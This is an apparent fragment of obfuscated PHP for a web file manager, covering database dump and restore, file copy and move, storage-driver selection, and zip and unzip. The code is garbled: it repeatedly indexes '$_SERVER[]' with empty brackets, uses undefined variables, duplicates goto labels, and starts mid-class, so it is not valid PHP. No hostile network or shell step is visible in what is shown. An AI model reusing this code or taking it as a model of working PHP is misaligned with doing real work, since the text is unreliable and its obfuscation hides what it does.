{ $e퇩 =& $_SERVER[]; $Dƫރ = $this->listData($c즱); $c = $this->findByName($b[$e퇩[28]]); if (!$Dƫރ || $c && $c[$e퇩[363]] != $Dƫރ[$e퇩[363]]) { return !1; } return parent::update($c즱, $b); } public function moveTop($Eء) { $aԍ =& $_SERVER[]; $d܍̍ = parent::listData(); $aН = $this->getSort($aԍ[241]); foreach ($d܍̍ as &$fδ) { if ($fδ[$aԍ[363]] == $Eء) { $fδ[$aԍ[2089]] = $aН; continue; } $fδ[$aԍ[2089]] += 1; } return parent::resetData($d܍̍); } public function moveBottom($Dġ) { $c =& $_SERVER[]; $aѤȊ = $this->getSort($c[242]) + 1; return parent::update($Dġ, array($c[2089] => $aѤȊ)); } public function resetSort($Fܶ) { goto AԌí; Fސ: return parent::resetData($aǉ); goto e; AԌí: $BՆ =& $_SERVER[]; $Aؔֈ = array(); $Fܶ = is_array($Fܶ) ? $Fܶ : array(); goto Cה; Cה: for ($AƜ = 0; $AƜ < count($Fܶ); $AƜ++) { $Aؔֈ[$Fܶ[$AƜ] . $BՆ[33]] = $AƜ + 1; } $aǉ = parent::listData(); foreach ($aǉ as &$DǴՖ) { $Fه = $Aؔֈ[$DǴՖ[$BՆ[363]]]; $DǴՖ[$BՆ[2089]] = $Fه ? $Fه : $DǴՖ[$BՆ[2089]]; } goto Fސ; e: } private function getSort($DװϬ) { $eν =& $_SERVER[]; $aꉋҒ = parent::listData(); $C敦 = array_to_keyvalue($aꉋҒ, $eν[33], $eν[2089]); if (!$C敦) { $C敦 = array(0); } $Dȼ = $DװϬ == $eν[242] ? max($C敦) : min($C敦); return intval($Dȼ); } } goto E; eӜ: $aޯ = $_SERVER[][543]; $_SERVER[ʆ] = explode($_SERVER[][544], gzinflate(substr($_SERVER[][545], 10, -8))); $eֱȾ = $_SERVER[][546]; goto Eڐ; A: class DbManage { function __construct($D̐, $f = '') { $this->database = $D̐; $this->type = $f; } public function model($F뚾 = '') { return new ModelBase($F뚾, $_SERVER[][33], $this->database); } public function db($e؂ = false) { goto aٽ㞏; b: $this->database = $B; $aҮ->execute("\x75\x73\x65\x20\x60{$Dڒ}\x60"); return $aҮ; goto aٶ; aٽ㞏: $c഼ =& $_SERVER[]; $B = $this->database; if ($this->type == $c഼[9] || !$e؂) { return $this->model()->db(); } goto F֕ߴ; F֕ߴ: $Dڒ = $B[$c഼[230]]; $B[$c഼[230]] = $c഼[33]; if ($B[$c഼[874]] == $c഼[710]) { $c愢 = $B[$c഼[873]]; $B[$c഼[873]] = substr($c愢, 0, strrpos($c愢, $c഼[962])); } goto e奖; fڹ: if (!$e﷓) { $aҮ->execute("\143\x72\145\x61\x74\145\40\144\141\164\141\142\x61\163\x65\40\x60{$Dڒ}\x60"); } $B[$c഼[230]] = $Dڒ; if ($B[$c഼[874]] == $c഼[710]) { $B[$c഼[873]] .= $c഼[962] . $Dڒ; } goto b; e奖: $this->database = $B; $aҮ = $this->model()->db(); $e﷓ = $aҮ->execute("\163\x68\x6f\167\x20\x64\141\164\141\x62\141\163\145\163\x20\x6c\151\x6b\x65\x20\x27{$Dڒ}\47"); goto fڹ; aٶ: } public function createTable($cᡌ, $BЗ¹ = null) { $bІΊ =& $_SERVER[]; if (!IO::exist($cᡌ)) { show_json(LNG($bІΊ[963]), !1); } $Dϴť = sqlSplit(IO::getContent($cᡌ)); foreach ($Dϴť as $Aɼ) { if ($BЗ¹) { $c҈ = stripos($Aɼ, $bІΊ[964]) === 0; if ($c҈) { $BЗ¹->task[$bІΊ[965]] += 1; } } $this->model()->db()->execute($Aɼ); if ($BЗ¹ && $c҈) { $c = $bІΊ[966]; preg_match($c, $Aɼ, $B); $BЗ¹->task[$bІΊ[967]] = trim($eѸՠ[0], $bІΊ[810]); $BЗ¹->update(1); } } $this->taskToCache($BЗ¹); } public function insertTable($bƸ, $a谵 = null) { $f܊ =& $_SERVER[]; foreach ($bƸ as $Aʤ) { $A = basename($Aʤ); $A = substr($A, 0, strrpos($A, $f܊[91])); if ($a谵) { $a谵->task[$f܊[967]] = $A; } if (get_filesize($Aʤ) == 0) { continue; } $eŏե = $this->sqlToDb($Aʤ, $a谵); if (!$eŏե) { show_json(LNG($f܊[968]) . "\x5b{$A}\135", !1); } } $this->taskToCache($a谵); } public function sqlFromDb($CÝ, $eԤĦ, $FԄ = null, $e잊 = null) { goto c; c: if ($FԄ) { $FԄ->task[$_SERVER[][967]] = $CÝ; } $c쨽 = $this->model($CÝ); $C隺 = 0; goto c޺; a廝: fclose($Fƴ); return $C隺; goto dҠ; c޺: $eɎś = 1; $Cÿ߄ = 500; $Fƴ = fopen($eԤĦ, $_SERVER[][969]); goto DŐ; DŐ: $A = $c쨽->getPk(); $fͤ = $c쨽->getDbFields(); do { $Fᴷ = $c쨽->field($fͤ)->order($A . $_SERVER[][970])->selectPage($Cÿ߄, $eɎś); $cͨ = !empty($Fᴷ[$_SERVER[][350]]) ? $Fᴷ[$_SERVER[][350]] : array(); if (!($b = count($cͨ))) { break; } if ($FԄ) { $FԄ->task[$_SERVER[][965]] += $b; } $dꈻѯ = array(); foreach ($cͨ as $a⣦Ѯ) { if ($e잊) { $a⣦Ѯ[$_SERVER[][75]] = "\173\151\x6f\x3a{$e잊}\175" . substr($a⣦Ѯ[$_SERVER[][75]], strlen("\173\x69\157\72{$a⣦Ѯ[$_SERVER[][729]]}\175")); $a⣦Ѯ[$_SERVER[][729]] = $e잊; } $dꈻѯ[] = $_SERVER[][971] . $this->sqlEncode($a⣦Ѯ) . $_SERVER[][972]; } $Eҟ = "\x49\x4e\x53\x45\122\124\x20\x49\116\x54\117\40\140{$CÝ}\140\x20\50\140" . implode($_SERVER[][973], $fͤ) . $_SERVER[][974]; fwrite($Fƴ, $Eҟ . implode($_SERVER[][975], $dꈻѯ) . $_SERVER[][67] . PHP_EOL); $eɎś++; $C隺 += $b; if ($FԄ) { $FԄ->update($b); } } while ($b == $Cÿ߄); goto a廝; dҠ: } public function sqlToDb($fÈ, $cƧ = null) { goto Fƾ; DΓğ: $CޏڣŔ = 500 + 1; while (!feof($F)) { if ($cƧ && $B != 0) { $cƧ->task[$eĜ[965]] += 1; } $B++; $fܣ = trim(fgets($F)); $a .= $eĜ[50] . $this->sqlDecode($fܣ, $this->type); if ($B == $CޏڣŔ) { $a = rtrim(trim($a), $eĜ[67]); if (!$b¶->execute($a)) { return !1; } if ($cƧ) { $cƧ->update($B - 1); } $a = $eĜ[33]; $B = 0; } } fclose($F); goto E; E: if ($a) { $a = rtrim(trim($a), $eĜ[67]); if (!$b¶->execute($a)) { return !1; } if ($cƧ) { $cƧ->update($B - 1); } } return !0; goto B݆; A槍: if (!$F) { return !1; } $B = 0; $a = $eĜ[33]; goto DΓğ; Fƾ: $eĜ =& $_SERVER[]; $b¶ = $this->model()->db(); $F = @fopen($fÈ, $eĜ[976]); goto A槍; B݆: } public function dropTable($D쵞 = null) { $e = $this->model()->db(); $a՝ = $D쵞 ? array($D쵞) : $e->getTables(); if (!$a՝) { return; } foreach ($a՝ as $D쵞) { $e->execute("\144\162\157\x70\x20\164\x61\x62\154\145\40\151\146\40\145\170\x69\163\164\x73\40\140{$D쵞}\140"); } } private function taskToCache($E = null) { $E =& $_SERVER[]; if (!$E) { return; } $f = array($E[967] => $E->task[$E[967]], $E[965] => $E->task[$E[965]], $E[977] => $E->task[$E[977]]); if ($f[$E[965]] == $f[$E[977]]) { $f[$E[682]] = 1; } Cache::set($E[978] . $E->task[$E[363]], $f); $E->end(); } private function sqlEncode($eԝ) { $F =& $_SERVER[]; $e۽ = array(); foreach ($eԝ as $b˥䔵) { if (is_array($b˥䔵)) { $b˥䔵 = json_encode_force($b˥䔵); } $b˥䔵 = addslashes($b˥䔵); $b˥䔵 = str_replace(array($F[979], $F[213]), array($F[980], $F[981]), $b˥䔵); $e۽[] = str_replace($F[55], $F[982], $b˥䔵); } return $F[55] . implode($F[983], $e۽) . $F[55]; } private function sqlDecode($Cإǐц, $F) { $D댔 =& $_SERVER[]; $Cإǐц = str_replace(array($D댔[980], $D댔[981]), array($D댔[979], $D댔[213]), $Cإǐц); if ($F == $D댔[9]) { $Cإǐц = stripslashes($Cإǐц); } return $Cإǐц; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($c, $e) { $d = self::driverMake($e[0]); if (method_exists($d, $c)) { return @call_user_func_array(array($d, $c), $e); } if (method_exists($d, $_SERVER[][984])) { return @call_user_func_array(array($d, $c), $e); } else { if (method_exists(self, $c)) { return @call_user_func_array(array(self, $c), $e); } else { call_user_func_array(array(parent, $c), $e); } } } public static function init($fٶ) { return self::driverMake($fٶ); } public static function copy($b̳Ղ, $A, $F˭ = false, $cг = false) { return self::copyMove($b̳Ղ, $A, $F˭, $_SERVER[][486], $cг); } public static function move($E䨖, $b, $Eν = false, $bЮď = false) { return self::copyMove($E䨖, $b, $Eν, $_SERVER[][488], $bЮď); } public static function saveFile($b, $dœ, $eޞ = true) { goto aؑ; aؑ: $Dؤ뺻 =& $_SERVER[]; $b笅 = self::info($dœ); $D퉯 = self::driverMake($b); goto c˨; f: $fŷئ = $b->pathFather($dœ); $e؈ = !0; if (!$eޞ && self::driverIsSame($D퉯, $b)) { $e؈ = !1; } goto dٷ; dٷ: $A˲ = self::copyFile($D퉯, $b, $b, $fŷئ, $b笅[$Dؤ뺻[28]], $e؈); if ($dې) { $A˲ = $dې->getPathOuter($A˲); } return $A˲; goto Dǻ; c˨: $b = self::driverMake($dœ); $dې = !1; if ($b->pathParse[$Dؤ뺻[985]]) { $eӝ = $b->pathParse[$Dؤ뺻[985]]; $dې = $b; $b = self::driverMake($eӝ); } goto f; Dǻ: } private static function copyMove($e, $Bϯ, $Cظ, $cµ, $a = false) { goto EͲ; Fߒ: Hook::trigger($Eכ[72], $a蕽, $e, $d, $Bϯ); $d舰ͭ = self::driverIsSame($a蕽, $d); if ($d舰ͭ) { if ($cµ == $Eכ[488] && trim($Bϯ, $Eכ[8]) == trim($d->pathFather($e), $Eכ[8])) { return $d->getPathOuter($e); } if (method_exists($d, $cµ)) { return $d->{$cµ}($e, $Bϯ, $Cظ); } } goto Bߌ; Bߌ: $A = $a蕽->isFile($e); if (!$A && $d->getType() == $Eכ[680] && $a蕽->getType() == $Eכ[101]) { $E᜺ = $d->copyFolderFromIO($a蕽, $e, $Bϯ, $Cظ, $Aٸ, $a); } else { $E᜺ = self::copyPath($a蕽, $e, $d, $Bϯ, $Cظ, $Aٸ, $A, $a); } if ($E᜺ && $Aٸ) { $a蕽->remove($e); } goto E峚; E峚: if ($B) { $E᜺ = $B->getPathOuter($E᜺); } return $E᜺; goto Eւ; aݠ: $a蕽 = self::driverMake($e); $d = self::driverMake($Bϯ); $Aٸ = $cµ == $Eכ[488]; goto C; C: $B = !1; if ($d->pathParse[$Eכ[985]]) { $Bϯ = $d->pathParse[$Eכ[985]]; $B = $d; $d = self::driverMake($Bϯ); } self::check($a蕽, $e, $d, $Bϯ); goto Fߒ; EͲ: $Eכ =& $_SERVER[]; if (!$e || $e == $Eכ[8] || !$Bϯ) { return !1; } ignore_timeout(); goto aݠ; Eւ: } private static function check($F, $Dȡ, $bơیШ, &$D戯) { $A =& $_SERVER[]; if (self::driverIsSame($F, $bơیШ) && $F->isFolder($Dȡ) && $F->isParentOf($Dȡ, $D戯)) { show_json(LNG($A[986]), !1); } if (!$F->exist($Dȡ)) { show_json(LNG($A[100]), !1); } } private static function copyPath($f޶Ȃ, $B, $fƋٸ, $DɎӋ, $cĘ, $c, $cŤǿ, $D˨襚 = false) { goto a۔; e֒Ŕ: $D됈 = $fƋٸ->mkdir($fƋٸ->getPath($Bᆓ)); $DɎӋ = $fƋٸ->getPathInner($D됈); $A = $f޶Ȃ->listPath($B, !0); goto D; a۔: $fԷ =& $_SERVER[]; $A֕ = $D˨襚 ? $D˨襚 : $f޶Ȃ->getPathName($f޶Ȃ->pathThis($B)); if ($cĘ) { $A牊 = $fƋٸ->fileNameExist($DɎӋ, $A֕); $A֕ = $fƋٸ->fileNameAuto($DɎӋ, $A֕, $cĘ, !$cŤǿ); $cĘ = $A牊 ? $cĘ : !1; } goto AƋ; AƋ: if ($cŤǿ) { return self::copyFile($f޶Ȃ, $B, $fƋٸ, $DɎӋ, $A֕, $c); } if ($cĘ == REPEAT_RENAME_FOLDER) { $cĘ = !1; } $Bᆓ = rtrim($DɎӋ, $fԷ[8]) . $fԷ[8] . $A֕; goto e֒Ŕ; D: $c߽ = array_merge($A[$fԷ[73]], $A[$fԷ[74]]); foreach ($c߽ as $c) { $B筰 = $c[$fԷ[29]] == $fԷ[163]; $B = $f޶Ȃ->getPathInner($c[$fԷ[75]]); $a摏 = self::copyPath($f޶Ȃ, $B, $fƋٸ, $DɎӋ, $cĘ, $c, $B筰); if (!$a摏) { write_log($fԷ[987] . $B . $fԷ[988] . $DɎӋ, $fԷ[989]); } } return $D됈; goto CӴک; CӴک: } private static function copyFile($f, $e˰, $e򉑩, $cу, $Cʍܛ, $D) { goto Bͫβ; d: Hook::trigger($EӞ[991], $f, $e˰, $e򉑩, $cу, $Cʍܛ, $e); if (self::driverIsSame($f, $e򉑩)) { if ($D) { $cጼ = $e򉑩->moveFile($e˰, $cу); } else { $cጼ = $e򉑩->copyFile($e˰, $cу); } Hook::trigger($EӞ[992], $f, $e˰, $e򉑩, $cу, $Cʍܛ, $cጼ); return $cጼ; } $d = TEMP_FILES; goto f㣠ߞ; Fյ: $EѲ = $f->iconvApp($EѲ); $cጼ = $e򉑩->upload($cу, $EѲ, $D); self::remove($d . $e); goto b団; b団: Hook::trigger($EӞ[992], $f, $e˰, $e򉑩, $cу, $Cʍܛ, $cጼ); return $cጼ; goto B; f㣠ߞ: mk_dir($d); $EѲ = $d . $e; $EѲ = $f->download($e˰, $EѲ); goto Fյ; Bͫβ: $EӞ =& $_SERVER[]; $cу = $e򉑩->getPath(rtrim($cу, $EӞ[8]) . $EӞ[8] . $Cʍܛ); $e = $EӞ[990] . time() . rand_string(5); goto d; B: } public static function pathFather($DΉ͢) { $e፪ = IO::init($DΉ͢); $BÉĭх = $e፪->pathFather($e፪->path); return $e፪->getPathOuter($BÉĭх); } public static function fileOut($EɓȽ, $BϏ򧇭 = false, $CƂ = false, $DˤЩ = '') { $Cנښ = self::driverMake($EɓȽ); if ($Cנښ->isFileOutServer()) { return $Cנښ->fileOutServer($EɓȽ, $BϏ򧇭, $CƂ, $DˤЩ); } return $Cנښ->fileOut($EɓȽ, $BϏ򧇭, $CƂ, $DˤЩ); } public static function fileOutImage($aۿ, $DĐ = 250) { $E鋐 = array(250, 600, 1200, 3000); for ($A = 0; $A < count($E鋐); $A++) { if ($A == 0 && $DĐ <= $E鋐[$A]) { $DĐ = $E鋐[$A]; break; } else { if ($DĐ > $E鋐[$A - 1] && $DĐ <= $E鋐[$A]) { $DĐ = $E鋐[$A]; break; } else { if ($A == count($E鋐) - 1 && $DĐ > $E鋐[$A]) { $DĐ = $E鋐[$A]; break; } } } } $aøԿ = self::driverMake($aۿ); if ($aøԿ->isFileOutServer()) { return $aøԿ->fileOutImageServer($aۿ, $DĐ); } return $aøԿ->fileOutImage($aۿ, $DĐ); } private static function driverIsSame($A, $Eէ) { goto c߲; c߲: $CҢ =& $_SERVER[]; $D޷ = $A->getType(); $D躘 = $Eէ->getType(); goto cռٓ; c䫴: if ($A->pathDriver == $Eէ->pathDriver) { return !0; } return !1; goto DЃ; cռٓ: if ($D޷ != $D躘) { return !1; } if ($D޷ == $CҢ[680]) { return !0; } if ($D޷ == $CҢ[101]) { return !0; } goto c䫴; DЃ: } public static function copyUpdate($cǲ, $Fʄ) { goto dәѾ; DΜ: Hook::trigger($E̴[996], $cǲ, $Fʄ, $c); foreach ($D as $EӼ) { IO::mkdir($EӼ); } foreach ($C忼 as $EӼ) { IO::copy($EӼ[$E̴[993]], $EӼ[$E̴[994]], REPEAT_REPLACE); } goto Eǈ; dәѾ: $E̴ =& $_SERVER[]; if (!IO::exist($cǲ)) { return !1; } if (!IO::exist($Fʄ)) { IO::mkdir($Fʄ); } goto Aښ㖨ۃ; Aښ㖨ۃ: $eЋ = self::_listAll($cǲ); $E = self::_listAll($Fʄ); $C忼 = array(); goto dҲ; dҲ: $D = array(); foreach ($eЋ as $a => $EӼ) { if (isset($E[$a])) { if ($EӼ[$E̴[76]] == 1) { continue; } if ($E[$a][$E̴[77]] == $EӼ[$E̴[77]]) { continue; } } if ($EӼ[$E̴[76]] == 1) { $D[] = $Fʄ . $E̴[8] . $a; continue; } $fݺ = strstr(trim($a, $E̴[8]), $E̴[8]) ? get_path_father($a) : $E̴[33]; $C忼[] = array($E̴[993] => $EӼ[$E̴[75]], $E̴[994] => rtrim($Fʄ, $E̴[8]) . $E̴[8] . $fݺ, $E̴[995] => $EӼ); } $c = array($E̴[163] => $C忼, $E̴[76] => $D); goto DΜ; Eǈ: } private static function _listAll($fڈ) { $c褙 =& $_SERVER[]; $fڈ = KodIO::clear($fڈ); $Fә = IO::listAll($fڈ); foreach ($Fә as &$f) { $Aݶ = substr($f[$c褙[75]], strlen($fڈ)); $f[$c褙[997]] = trim($Aݶ, $c褙[8]); } return array_to_keyvalue($Fә, $c褙[997]); } public static function fileSubstr($fګ߉, $dҗ, $aȳ = false) { goto c; C: if ($dҗ + $aȳ > $B̃Ӝ) { $aȳ = $B̃Ӝ - $dҗ; } if ($aȳ <= 0) { return $_SERVER[][33]; } if ($dҗ < 0 || $dҗ >= $B̃Ӝ || $aȳ > 1024 * 1024 * 5) { throw new Exception("\x66\151\154\x65\x52\x65\141\x64\x20\145\x72\x72\157\x72\x21\40\x73\x74\x61\x72\164\75{$dҗ}\x3b\x6c\x65\156\147\x74\150\75{$aȳ}\73\40\163\151\x7a\145\x3d{$B̃Ӝ}\x3b"); } goto aåѡ; aåѡ: return $B㐷->fileSubstr($fګ߉, $dҗ, $aȳ); goto f; c: $B㐷 = self::driverMake($fګ߉); $B̃Ӝ = $B㐷->size($fګ߉); $f = $dҗ; goto E˝ѿ; E˝ѿ: $bֳӑ = $aȳ; if ($dҗ < 0) { $dҗ = $B̃Ӝ + $dҗ; } if ($aȳ === !1) { $aȳ = $B̃Ӝ - $dҗ; } goto C; f: } private static function driverMake(&$e) { goto fµ; D: return $D; goto F; fµ: $C𪑣 =& $_SERVER[]; $B = KodIO::parse($e); if (!self::$driverListSystem) { $aڔ = Model($C𪑣[690])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($aڔ, $C𪑣[363]); } goto fɅ; fɅ: if ($B[$C𪑣[29]] == KodIO::KOD_IO && !self::$driverListSystem[$B[$C𪑣[363]]]) { return !1; } $e = $B[$C𪑣[998]]; $D = self::driverGet($B, $e); goto D; F: } private static function driverGet($fՅ, &$bىվ) { goto CǪׅ; Eʋ: $f춈 = self::$driverCache[$F]; $f춈->pathDriver = $Cͫ; $f춈->pathBase = $dَ[33]; goto c; c: if (isset($eϳ[$dَ[6]][$dَ[1011]])) { $f춈->pathBase = rtrim($eϳ[$dَ[6]][$dَ[1011]], $dَ[8]) . $dَ[8]; $bىվ = $f춈->pathBase . ltrim($bىվ, $dَ[8]); } $bىվ = $f춈->getPath($bىվ); if (isset($fՅ[$dَ[985]])) { $bىվ = $fՅ[$dَ[985]]; } goto Aߕ; CǪׅ: $dَ =& $_SERVER[]; $Cͫ = $fՅ[$dَ[999]]; $E = $fՅ[$dَ[363]]; goto fܬ; Aߕ: $f춈->path = $bىվ; return $f춈; goto f; fܬ: switch ($fՅ[$dَ[29]]) { case KodIO::KOD_IO: $eϳ = self::$driverListSystem[$E]; break; case KodIO::KOD_SOURCE: $bىվ = $E . $bىվ; $eϳ = array($dَ[1000] => $dَ[1001], $dَ[6] => $fՅ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $e = $GLOBALS[$dَ[1002]]; self::$driverListUser = array_to_keyvalue($e, $dَ[363]); } $eϳ = self::$driverListUser[$E]; break; case KodIO::KOD_SHARE_LINK: $eϳ = array($dَ[1000] => $dَ[1003], $dَ[6] => $fՅ); $Aԭ = Action($dَ[1004])->sharePathInfo($fՅ[$dَ[75]]); $bىվ = $Aԭ[$dَ[365]]; if (!$Aԭ[$dَ[365]]) { $f轚 = Model($dَ[532])->getInfo($Aԭ[$dَ[437]]); $bىվ = KodIO::clear($f轚[$dَ[1005]] . $fՅ[$dَ[998]]); $fՅ[$dَ[435]] = $f轚; $fՅ[$dَ[985]] = $bىվ; $eϳ = array($dَ[1000] => $dَ[1006], $dَ[6] => $fՅ); } break; case KodIO::KOD_SHARE_ITEM: $eϳ = array($dَ[1000] => $dَ[1007], $dَ[6] => $fՅ); $f轚 = Model($dَ[532])->getInfo($fՅ[$dَ[363]]); if ($f轚[$dَ[365]] == $dَ[464]) { $bىվ = KodIO::clear($f轚[$dَ[1005]] . $fՅ[$dَ[998]]); $fՅ[$dَ[435]] = $f轚; $fՅ[$dَ[985]] = $bىվ; $eϳ = array($dَ[1000] => $dَ[1008], $dَ[6] => $fՅ); } break; default: $bىվ = $fՅ[$dَ[75]]; $eϳ = array($dَ[1000] => $dَ[1009]); break; } $F = $fՅ[$dَ[75]]; if (!isset(self::$driverCache[$F])) { $aӶ = strtolower($eϳ[$dَ[90]]); $Aͫկ = $GLOBALS[$dَ[6]][$dَ[84]][$dَ[1010]]; $cᆼ = $dَ[71] . (isset($Aͫկ[$aӶ]) ? $Aͫկ[$aӶ] : ucfirst($aӶ)); if (!class_exists($cᆼ)) { show_json("{$cᆼ}\x20\x6e\157\x74\x20\x65\170\x69\163\x74\163\41", !1); } $cˣ = isset($eϳ[$dَ[6]]) ? $eϳ[$dَ[6]] : !1; self::$driverCache[$F] = new $cᆼ($cˣ); } goto Eʋ; f: } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $dไ; if (!$dไ) { $Eˉن = IO::init($_SERVER[][8]); } return $Eˉن; } private static function iconvSystem($f) { return self::local()->iconvSystem($f); } private static function iconvApp($eĈť) { return self::local()->iconvApp($eĈť); } public static function zip($E, $bݔ = "\x7a\x69\160", $Dմ = '', $Dؽ = REPEAT_RENAME) { goto DϿ; E: if (count($e椹Ӡ) > 1) { $f渏 = IO::info(IO::pathFather($Dޜ[$fӼ[75]])); $bܓθ = $f渏[$fӼ[28]]; } $fԌХ = $F; if (!$fԌХ) { $fԌХ = get_path_father($Dޜ[$fӼ[75]]); $F̂ = IO::info($fԌХ); if (!$F̂[$fӼ[185]]) { show_json(LNG($fӼ[1013]), !1); } } goto b璞; f: $F = !1; if (!$Dմ && $ȩ->getType() == $fӼ[101]) { $e椹Ӡ = self::zipFileList($E); } else { $F = $Dմ ? $Dմ : TEMP_FILES . $fӼ[1012] . time() . rand_string(8) . $fӼ[8]; mk_dir($F); $e椹Ӡ = self::zipFileList($E, $F); } $bܓθ = $Dޜ[$fӼ[28]]; goto E; b璞: $dɾ拋 = $fԌХ . $bܓθ . $fӼ[91] . $bݔ; $dɾ拋 = get_filename_auto($dɾ拋, $fӼ[33], $Dؽ); $F⧃ĸ = self::iconvSystem($dɾ拋); goto C; C: foreach ($e椹Ӡ as $CǾǯ => $d褕) { $e椹Ӡ[$CǾǯ] = self::iconvSystem($d褕); } KodArchive::create($F⧃ĸ, $e椹Ӡ); if (!IO::exist($dɾ拋)) { if ($F) { del_dir($F); } show_json(LNG($fӼ[1014]), !1); } goto Eۍ; DϿ: $fӼ =& $_SERVER[]; $ȩ = self::init($E[0][$fӼ[75]]); $Dޜ = self::info($E[0][$fӼ[75]]); goto f; Eۍ: if ($Dմ || !$F) { if ($F && strstr($F, TEMP_FILES)) { $D萂 = $e椹Ӡ = array(); recursion_dir($fԌХ, $D萂, $e椹Ӡ, 0); foreach ($D萂 as $c) { del_dir($c); } foreach ($e椹Ӡ as $E̾) { if ($E̾ == $F⧃ĸ) { continue; } del_file($E̾); } } return $dɾ拋; } $c = self::pathFather($Dޜ[$fӼ[75]]); $b = self::move($dɾ拋, $c, $Dؽ); goto E翶; E翶: if (!$b) { del_dir($F); show_json(LNG($fӼ[1014]), !1); } del_dir($F); return $b; goto D̪; D̪: } public static function unzip($E˂ן, $FՔ = "\x72\145\160\154\141\x63\145") { goto dث; dث: $Fԫ =& $_SERVER[]; $f = $E˂ן[$Fԫ[75]]; $DУ = $E˂ן[$Fԫ[1015]]; goto BЅІ; E: if (!@file_exists(self::iconvSystem($Eټ))) { $FњĨ = self::localFilePath($f, $E۟); $Eټ = $FњĨ ? $FњĨ : parent::download($f, $Eټ); } $Eټ = self::iconvSystem($Eټ); $dѫΥ = isset($E˂ן[$Fԫ[1017]]) ? $E˂ן[$Fԫ[1017]] : $Fԫ[1018]; goto D; E: Hook::trigger($Fԫ[1022], $d퓾); recursion_dir($d퓾, $C, $BՊ, 0); $E = array_merge($C, $BՊ); goto eµ; Eڷ: $D = self::tmpFileName($b); $d퓾 = TEMP_FILES . $D; del_dir($d퓾); goto F렆; D: $Dɋ = KodArchive::extract($Eټ, $d퓾 . $Fԫ[8], $dѫΥ); self::archiveExt(); if (!$Dɋ[$Fԫ[1019]]) { show_json($Fԫ[1020] . $Dɋ[$Fԫ[1021]], !1); } goto E; eµ: foreach ($E as $cΏ) { $cΏ = self::iconvApp($cΏ); self::move($cΏ, $DУ, $FՔ); } del_dir($d퓾); if (!$FњĨ) { del_file($Eټ); } goto Bؗӻ; BЅІ: if (!($b = parent::info($f))) { show_json(LNG($Fԫ[1016]), !1); } if (!($B󐻉ϟ = parent::infoFull($DУ))) { $DУ = parent::mkdir($DУ); $B󐻉ϟ = array($Fԫ[75] => $DУ); } else { if (isset($B󐻉ϟ[$Fԫ[365]]) && trim($B󐻉ϟ[$Fԫ[75]], $Fԫ[8]) != trim($DУ, $Fԫ[8])) { $EՑ = KodIO::make($B󐻉ϟ[$Fԫ[457]]); $Fʘ弮 = parent::fileNameAuto($EՑ, $B󐻉ϟ[$Fԫ[28]], REPEAT_RENAME_FOLDER, !0); $DУ = parent::mkdir($EՑ . $Fʘ弮); $B󐻉ϟ = array($Fԫ[75] => $DУ); } } $DУ = $B󐻉ϟ[$Fԫ[75]]; goto Eڷ; F렆: mk_dir($d퓾); $E۟ = self::fileExt($b); $Eټ = $d퓾 . $Fԫ[91] . $E۟; goto E; Bؗӻ: return !0; goto dγ; dγ: } public static function unzipList($eϮ) { goto f; f贯: $b诟 = json_encode($f[$a[1021]]); self::setContent($Aꅴ, $b诟); if (count($f[$a[1021]]) >= $Eɇ) { show_json(sprintf(LNG($a[1025]), count($f[$a[1021]])), !1); } goto b; F̑֡: $bߙ = self::info($eĽ); $cЊĖ = self::fileExt($bߙ); $bɖِ = self::tmpFileName($bߙ); goto bԪ; bԪ: if (isset($fԈ)) { $B = array($fԈ[$a[75]], $fԈ[$a[1023]], $fԈ[$a[28]]); $Cȴ = md5(implode($a[70], $B)) . $a[91] . get_path_ext($fԈ[$a[28]]); } else { $B = array($bߙ[$a[28]], $bߙ[$a[75]], $bߙ[$a[77]]); $Cȴ = md5(implode($a[70], $B)) . $a[91] . $cЊĖ; } if ($e֕ == -1) { $Aꅴ = IO_PATH_SYSTEM_TEMP . "\x7a\x69\x70\126\x69\x65\x77\57{$bɖِ}\x2f{$Cȴ}\56\x6c\x6f\x67"; $bڷ = self::infoFull($Aꅴ); if ($bڷ) { $Aꅴ = $bڷ[$a[75]]; $E蕌 = self::getContent($Aꅴ); if ($E蕌) { $b诟 = json_decode($E蕌, !0); if (count($b诟) >= $Eɇ) { show_json(sprintf(LNG($a[1025]), count($b诟)), !1); } return $b诟; } } else { $Aꅴ = self::mkfile($Aꅴ); } } $f⊺ = TEMP_FILES . $bɖِ; goto CО; e: $Eɇ = 50000; if (request_url_safe($a˚)) { $fԈ = parse_url_query($a˚); if (!isset($fԈ[$a[75]])) { show_json($a[1024], !1); } } $eĽ = isset($fԈ) ? $fԈ[$a[75]] : $a˚; goto F̑֡; f: $a =& $_SERVER[]; $a˚ = $eϮ[$a[75]]; $e֕ = isset($eϮ[$a[1023]]) ? $eϮ[$a[1023]] : -1; goto e; aօ: $F = self::iconvSystem($F); if ($e֕ >= 0) { $d̄ = isset($eϮ[$a[1027]]) ? $eϮ[$a[1027]] : !1; $d = isset($eϮ[$a[28]]) ? $eϮ[$a[28]] : $a[33]; KodArchive::filePreview($F, $e֕, $d̄, $d); self::archiveExt(); die; } $f = KodArchive::listContent($F); goto f̵; CО: if (!is_dir($f⊺)) { mk_dir($f⊺); } $F = $f⊺ . $a[8] . $Cȴ; if (!@file_exists(self::iconvSystem($F))) { if (isset($fԈ)) { url_request($a˚, $a[1026], $F); } else { $D黃 = self::localFilePath($a˚, $cЊĖ); $F = $D黃 ? $D黃 : self::download($a˚, $F); } } goto aօ; b: return $f[$a[1021]]; goto D; f̵: self::archiveExt(); del_dir($f⊺); if (!$f[$a[1019]]) { show_json($f[$a[1021]], !1); } goto f贯; D: } private static function fileExt($c) { $Fɑ =& $_SERVER[]; $C = $c[$Fɑ[156]]; if ($C == $Fɑ[1028]) { $C = $Fɑ[1029]; if (substr($c[$Fɑ[28]], -strlen($C)) == $C) { $C = $Fɑ[1030]; } } self::archiveExt($C); return $C; } private static function zipFileList($CӠ, $dѰ = false) { $f݆ =& $_SERVER[]; $B˞ = array(); foreach ($CӠ as $D䢊) { $Fʓ = $D䢊[$f݆[75]]; if ($dѰ) { $Fʓ = self::copy($D䢊[$f݆[75]], $dѰ, $f݆[730]); } if ($Fʓ && self::local()->exist($Fʓ)) { $B˞[$D䢊[$f݆[75]]] = $Fʓ; } } if (!empty($B˞)) { return array_values($B˞); } show_json(LNG($f݆[1031]), !1); } public static function tmpFileName($A笿) { $cד =& $_SERVER[]; 